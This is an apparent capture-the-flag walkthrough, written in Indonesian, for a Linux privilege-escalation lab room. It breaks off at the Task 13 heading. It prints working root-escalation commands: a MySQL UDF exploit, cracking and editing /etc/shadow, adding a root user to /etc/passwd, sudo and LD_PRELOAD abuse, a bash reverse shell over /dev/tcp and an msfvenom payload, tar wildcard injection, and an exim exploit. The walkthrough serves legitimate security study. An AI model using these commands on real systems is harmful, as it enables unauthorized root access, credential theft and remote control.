room [Linux Privesc](https://tryhackme.com/room/linuxprivesc)
# Task 1 : Deploy VM

Deploy target. lalu connect ke target menggunakan ssh

```shell
ssh user@IP -o HostKeyAlgorithms=+ssh-rsa
```

selanjutnya lakukan command `id`, dan kita mendapat jawaban dari task 1

```shell
id
# uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
```

# Task 2 : Service Exploits

dalam task kedua ini, akan dipelajari service exploit, pada service MySql dalam hal ini. Jika kita cek dengan

```shell
ps aux
```

kita akan menemukan bahwa MySql berjalan sebagai root, dan juga root user dalam service ini tidak memiliki password. Kita dapat menggunakan exploit dari [exploit-db](https://www.exploit-db.com/exploits/1518) yang mengambil keuntungan dari UDFs (User Defined Functions) untuk menjalankan sistem sebagai root lwat MySql service.

1. ganti dir ke `/home/user/tools/mysql-udf`
2. compile `raptor_udf2.c` exploit dengan cara

```shell
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

3. connect ke MySql service sebagai root user dengan blank password dengan cara

```shell
mysql -u root
```

4. selanjutnya execute command berikut ketika sudah masuk di MySql service

```shell
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

5. selanjutnya copy `/bin/bash` ke /tmp/rootbash dan set SUID permission

```shell
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

6. lalu keluar dari MySql service, dan run `/tmp/rootbash` dengan `-p` untuk mendapatkan shell root. 

```shell
/tmp/rootbash -p
```

# Task 3 : Weak Files Permissions - Readable /etc/shadow

dari hasil enumerasi dengan LinEnum, dapat dilihat bahwa kita dapat membaca file `/etc/shadow` yang mana seharusnya hanya bisa dibaca oleh root user. jadi kita dapat mengambil root hash dan decrypt menggunakan hashcat atau jtr.

1. ambil salt+hash

```shell
cat /etc/shadow
#copy root
```

2. store salt+hash

```shell
echo "salt+hash" > hash
```

3. gunakan hashcat

```shell
hashcat -a 0 -m 1800  hash /usr/share/wordlists/rockyou.txt
```

4. hasilnya adalah

```
...
$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:password123
...
```

5. kita dapat cek dengan cara login ke root

```shell
su root
Password:password123
```

# Task 4 : Weak File Permissions - Writable /etc/shadow

ketika dicek lebih lanjut dengan `ls -la`, ternyata `/etc/shadow` dapat diedit, maka kita dapat mengganti password root dengan sesuka hati.

1. buat password baru

```shell
mkpasswd -m sha-512 password
# $6$...
```

2. selanjutnya edit hash root di `/etc/shadow` dengan yang baru

```shell
nano /etc/shadow

> root:<hash baru>:17298:0:99999:7:::
```

# Task 5 : Weak File Permissions - Write /etc/passwd

`/etc/passwd` dalam target ini juga dapat menjadi target privesc, karena meskipun memang readable untuk public, namun tidak seharusnya writeable. beberapa versi linux masih tetap bisa untuk storing password hash di `/etc/passwd`.

1. buat password

```shell
openssl passwd newpass
```

2. copy row root dan buat user root baru di paling bawah

```shell
nano /etc/passwd
```

```shell
newroot:<isi password>:0:0:root:/root:/bin/bash
```

3. setelah diganti, kita dapat login ke root user baru. dan kita bisa melakukan command `id` dan menjawab pertanyaan di Task 5 ini.

# Task 6 : Sudo - Shell Escape Sequences

selanutnya adalah memanfaatkan service yang dapat di run oleh root user tanpa memerlukan password. kita dapat cek dengan cara

```shell
sudo -l
...
# User user may run the following commands on this host:
    # (root) NOPASSWD: /usr/sbin/iftop
    # (root) NOPASSWD: /usr/bin/find
    # (root) NOPASSWD: /usr/bin/nano
    # (root) NOPASSWD: /usr/bin/vim
    # (root) NOPASSWD: /usr/bin/man
    # (root) NOPASSWD: /usr/bin/awk
    # (root) NOPASSWD: /usr/bin/less
    # (root) NOPASSWD: /usr/bin/ftp
    # (root) NOPASSWD: /usr/bin/nmap
    # (root) NOPASSWD: /usr/sbin/apache2
    # (root) NOPASSWD: /bin/more
```

selanjutnya kita dapat mencari payload untuk privesc di [gtfobins](https://gtfobins.github.io/).

1. kita dapat menggunakannya di iftop dengan 

```shell
sudo iftop

# ketika sudah masuk iftop, kita dapat escape dengan inject command
!/bin/bash
```

2. kita dapat menggunakan find dengan

```shell
sudo find . -exec /bin/sh \; -quit
```

dan masih banyak lagi.

# Task 7 : Sudo - Environment Variables

sudo bisa dikonfigurasi untuk dapat inherit beberapa environment variabel dari user environment.

cara cek `sudo -l`, dan cari bagian `env_keep`.
nantinya akan menghasilkan seperti berikut

```shell
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
...
```

ada 2 yang di inherit dari user environment, yaitu `LD_PRELOAD` dan `LD_LIBRARY_PATH`. 

- `LD_PRELOAD` akan load sebuah program sebelum apapun ketika program berjalan
- `LD_LIBRARY_PATH` provide dir list dimana shared library merupakan hal utama yang dicari duluan

**Cara exploitasinya**:

1. buat shared object menggunakan code yang terletak pada target mesin ini di `/home/user/tools/sudo/preload.c`

```shell
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

2. run program yang diperbolehkan dirun via sudo (ada hasilnya ketika `sudo -l`), saat sedang setting `LD_PRELOAD` environment variable ke full path dari shared objek yang baru.

```shell
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```

3. selanjutnya nanti root shell akan terspwan.


**Cara lainnya**:

1. jalankan `ldd` pada service apache2 untuk tau shared library mana yang digunakan oleh program

```shell
ldd /usr/sbin/apache2
```

2. selanjutnya buat shared objek dengan nama yang sama seperti sebelumnya(`libcrypt.so.1`) dengan menggunakan code yang ada di `/home/user/tools/sudo/library_path.c`

```shell
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

3. selanjutnya run apache2 dengan sudo saat sedang setting `LD_LIBRARY` environment variable ke `/tmp` (atau tempat output dari compiled objek)

```shell
sudo LD_LIBRARY_PATH=/tmp apache2
```

nantinya root shell akan spawn

# Task 8 : Cron Jobs - File Permissions

cron jobs merupakan program atau script dimana user menjadwalkannya untuk run diwaktu tertentu. Cron table files (crontabs) menyimpan konfigurasi dari cronjob. terletak di `/etc/crontab`

1. lihat isi crontab `cat /etc/crontab`. akan terdapat 2 cron jobs yang terjadwal untuk run tiap menit. satu run `overwrite.sh`, dan satunya lagi `/usr/local/bin/compress.sh`

2. cari full path `overwrite.sh` dengan cara 

```shell
locate overwrite.sh
```

3. kita dapat cek file permission nya

```shell
ls -la /usr/local/bin/overwrite.sh
```

4. lalu overwrite isi kontennya dengan

```shell
#!/bin/bash
bash -i >& /dev/tcp/IP-LOCAL/4444 0>&1
```

dan buka nc listener pada port tersebut.

# Task 9 : Cron Jobs - PATH Environment Variable

Cron Job path enviro var.

1. pertama, kita lihat isi dari crontab job dengan `cat /etc/crontab`. Dapat dilihat bahwa `PATH:..` var diawali dengan `/home/user` yang mana merupakan home dir dari user `user`.

2. selanjutnya kita buat file `overwrite.sh` di home direktori dengan isi:

```shell
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

3. selanjutnya pastikan untuk membuat file `overwrite.sh` menjadi executable dengan cara `chmod +x overwrite.sh`. selanjutnya hanya tinggal menunggu hingga cron job melakukan tugasnya untuk run file yang telah kita buat.

4. jika sudah, kita dapat mencoba command berikut untuk mendapatkan root shell.

```shell
/tmp/rootbash -p
```

# Task 10 : Cron Jobs - Wildcards

1. coba lihat konten dari cron job script lain

```shell
cat /usr/local/bin/compress.sh
```

hasilnya

```shell
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```

dari hasil tersebut dapat dilihat bahwa wildcard (simbol `*`) digunakan bersamaan dengan `tar` command di home dir. untuk hal ini, kita dapat lihat ke [GTFOBins untuk tar](https://gtfobins.github.io/gtfobins/tar/).

dapat dilihat dari GTFOBins bahwa `tar` memiliki command line options yang membuat kita dapat mengeksekusi command lainnya.

2. gunakan `msfvenom` untuk generate revshell ELF binary.

```shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=LOCAL-IP LPORT=LOCAL-PORT -f elf -o revshell.elf
```

dan tidak lupa untuk transfer file yang telah di generate ke target.

3. buat menjadi executable dengan `chmod +x revshell.elf`

4. buat dua file beriktu di home user

```shell
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```

5. Ketika tar command di run oleh cron jobs, maka wildcard (simbol `*`) akan expand dan memasukkan 2 file yang barusan kita buat. karena nama 2 file tersebut merupakan valid command dari `tar`, tar akan mengenali mereka sebagai cmdline options daripada filename.

6. selanjutnya setup netcat listener pada local box dan tunggu hingga cron job menjalankan file yang telah kita buat.

```shell
nc -lvnp L-PORT
```

7. atau kita dapat menggunakan `msfconsole` dengan multi handlernya.

# Task 11 - SUID / SGID Executables - Known Exploits

1. cari semua SUID/SGID executable di target

```shell
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
## atau
find / -perm -u=s -type f 2>/dev/null
```

2. lalu untuk kali ini kita fokus pada `/usr/sbin/exim-4.84-3`. Kita dapat mencari xploit untuk `exim 4.84` ini dengan searchsploit di kali.

```shell
searchsploit exim 4.84

###hasilnya
#...
# Exim 4.84-3 - Local Privilege Escalation                     | linux/local/39535.sh
#...
```

3. kita dapat copy xploit tersebut ke cwd dengan cara

```shell
searchsploit -m 39535
```

4. sebenarnya xploit sudah tersedia di target, namun for the sake of learning, kita dapat upload sendiri xploit ke target dengan `wget` dan `python`.

5. jika sudah selesai, maka kita dapat membuat file xploit menjadi executable di target dan run xploit tersebut.

```shell
chmod +x file.sh
./file.sh
```

# Task 12 - SUID / SGID Executables - Shared Object Injection 

1. cari SUID/GUID exec lagi

```shell
find / -perm -u=s -type f 2>/dev/null
```

2. kali ini kita berfokus pada `/usr/local/bin/suid-so`, yang mana vuln terhadap shared object. ketika kita run `/usr/local/bin/suid-so` akan keluar progress bar.

3. kita dapat gunakan `strace` untuk tracing progress bar tersebut.

```shell
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"

### hasil
# ...
# open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```

4. dapat dilihat bahwa dia coba untuk akses `/home/user/.config/libcalc.so`, tapi filenya tidak ditemukan. kita dapat membuat config dir untuk `libcalc`

```shell
mkdir /home/user/.config
```

5. selanjutnya kita dapat compile file `libcalc.c` yang ada di target ke .config dir yang telah dibuat

```shell
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```

6. run `/usr/local/bin/suid-so` untuk spawn root

# Task 13 - SUID / SGID Executables - Environment Variables